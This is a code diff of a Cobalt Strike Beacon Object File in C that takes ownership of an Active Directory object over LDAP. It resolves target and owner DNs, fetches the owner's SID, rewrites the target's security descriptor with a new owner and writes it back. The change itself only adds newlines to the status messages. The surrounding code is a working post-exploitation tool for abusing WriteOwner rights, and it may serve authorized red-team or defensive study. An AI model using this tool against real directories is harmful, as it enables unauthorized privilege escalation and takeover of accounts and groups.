@@ -17,12 +17,12 @@ void go(char *args, int alen) {
     int useLdaps = BeaconDataInt(&parser);
 
     if (!targetIdentifier || MSVCRT$strlen(targetIdentifier) == 0) {
-        BeaconPrintf(CALLBACK_ERROR, "[-] Target identifier is required");
+        BeaconPrintf(CALLBACK_ERROR, "[-] Target identifier is required\n");
         return;
     }
 
     if (!ownerIdentifier || MSVCRT$strlen(ownerIdentifier) == 0) {
-        BeaconPrintf(CALLBACK_ERROR, "[-] Owner identifier is required");
+        BeaconPrintf(CALLBACK_ERROR, "[-] Owner identifier is required\n");
         return;
     }
 
@@ -30,7 +30,7 @@ void go(char *args, int alen) {
     char* dcHostname = NULL;
     LDAP* ld = InitializeLDAPConnection(dcAddress, useLdaps, &dcHostname);
     if (!ld) {
-        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to initialize LDAP connection");
+        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to initialize LDAP connection\n");
         return;
     }
 
@@ -39,7 +39,7 @@ void go(char *args, int alen) {
     if (!isTargetDN || !isOwnerDN) {
         defaultNC = GetDefaultNamingContext(ld, dcHostname);
         if (!defaultNC) {
-            BeaconPrintf(CALLBACK_ERROR, "[-] Failed to get default naming context");
+            BeaconPrintf(CALLBACK_ERROR, "[-] Failed to get default naming context\n");
             if (dcHostname) MSVCRT$free(dcHostname);
             CleanupLDAP(ld);
             return;
@@ -58,7 +58,7 @@ void go(char *args, int alen) {
         char* searchBase = (searchOu && MSVCRT$strlen(searchOu) > 0) ? searchOu : defaultNC;
         targetDN = FindObjectDN(ld, targetIdentifier, searchBase);
         if (!targetDN) {
-            BeaconPrintf(CALLBACK_ERROR, "[-] Target '%s' not found", targetIdentifier);
+            BeaconPrintf(CALLBACK_ERROR, "[-] Target '%s' not found\n", targetIdentifier);
             if (defaultNC) MSVCRT$free(defaultNC);
             if (dcHostname) MSVCRT$free(dcHostname);
             CleanupLDAP(ld);
@@ -80,20 +80,20 @@ void go(char *args, int alen) {
         char* searchBase = (searchOu && MSVCRT$strlen(searchOu) > 0) ? searchOu : defaultNC;
         ownerDN = FindObjectDN(ld, ownerIdentifier, searchBase);
         if (!ownerDN) {
-            BeaconPrintf(CALLBACK_ERROR, "[-] Owner '%s' not found", ownerIdentifier);
+            BeaconPrintf(CALLBACK_ERROR, "[-] Owner '%s' not found\n", ownerIdentifier);
             MSVCRT$free(targetDN);
             if (defaultNC) MSVCRT$free(defaultNC);
             if (dcHostname) MSVCRT$free(dcHostname);
             CleanupLDAP(ld);
             return;
         }
-        BeaconPrintf(CALLBACK_OUTPUT, "[+] Owner DN: %s", ownerDN);
+        BeaconPrintf(CALLBACK_OUTPUT, "[+] Owner DN: %s\n", ownerDN);
     }
 
     // Get the SID of the new owner
     ownerSid = GetObjectSid(ld, ownerDN);
     if (!ownerSid) {
-        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to retrieve owner SID");
+        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to retrieve owner SID\n");
         MSVCRT$free(targetDN);
         if (ownerDN) MSVCRT$free(ownerDN);
         if (defaultNC) MSVCRT$free(defaultNC);
@@ -105,14 +105,14 @@ void go(char *args, int alen) {
     // Convert SID to string for display
     char* ownerSidStr = SidToString(ownerSid);
     if (ownerSidStr) {
-        BeaconPrintf(CALLBACK_OUTPUT, "[+] Owner SID: %s", ownerSidStr);
+        BeaconPrintf(CALLBACK_OUTPUT, "[+] Owner SID: %s\n", ownerSidStr);
         MSVCRT$free(ownerSidStr);
     }
 
     // Read current security descriptor
     BERVAL* sdBerval = ReadSecurityDescriptor(ld, targetDN);
     if (!sdBerval) {
-        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to read security descriptor");
+        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to read security descriptor\n");
         MSVCRT$free(ownerSid);
         MSVCRT$free(targetDN);
         if (ownerDN) MSVCRT$free(ownerDN);
@@ -125,7 +125,7 @@ void go(char *args, int alen) {
     // Convert to absolute format for modification
     PSECURITY_DESCRIPTOR pSD = ConvertBervalToSecurityDescriptor(sdBerval);
     if (!pSD) {
-        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to convert security descriptor to absolute format");
+        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to convert security descriptor to absolute format\n");
         MSVCRT$free(sdBerval->bv_val);
         MSVCRT$free(sdBerval);
         MSVCRT$free(ownerSid);
@@ -143,7 +143,7 @@ void go(char *args, int alen) {
 
     // Set the new owner
     if (!ADVAPI32$SetSecurityDescriptorOwner(pSD, ownerSid, FALSE)) {
-        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to set security descriptor owner");
+        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to set security descriptor owner\n");
         MSVCRT$free(pSD);
         MSVCRT$free(ownerSid);
         MSVCRT$free(targetDN);
@@ -157,7 +157,7 @@ void go(char *args, int alen) {
     // Convert back to self-relative format for writing
     BERVAL* newSdBerval = ConvertSecurityDescriptorToBerval(pSD);
     if (!newSdBerval) {
-        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to convert security descriptor to self-relative format");
+        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to convert security descriptor to self-relative format\n");
         MSVCRT$free(pSD);
         MSVCRT$free(ownerSid);
         MSVCRT$free(targetDN);
@@ -172,11 +172,11 @@ void go(char *args, int alen) {
     BOOL success = WriteSecurityDescriptor(ld, targetDN, newSdBerval);
 
     if (success) {
-        BeaconPrintf(CALLBACK_OUTPUT, "[+] Successfully set owner");
-        BeaconPrintf(CALLBACK_OUTPUT, "[+] New owner: %s", ownerDN ? ownerDN : ownerIdentifier);
+        BeaconPrintf(CALLBACK_OUTPUT, "[+] Successfully set owner\n");
+        BeaconPrintf(CALLBACK_OUTPUT, "[+] New owner: %s\n", ownerDN ? ownerDN : ownerIdentifier);
     } else {
-        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to write security descriptor");
-        BeaconPrintf(CALLBACK_ERROR, "[!] Note: WriteOwner permission or administrative rights required");
+        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to write security descriptor\n");
+        BeaconPrintf(CALLBACK_ERROR, "[!] Note: WriteOwner permission or administrative rights required\n");
     }
 
     // Cleanup
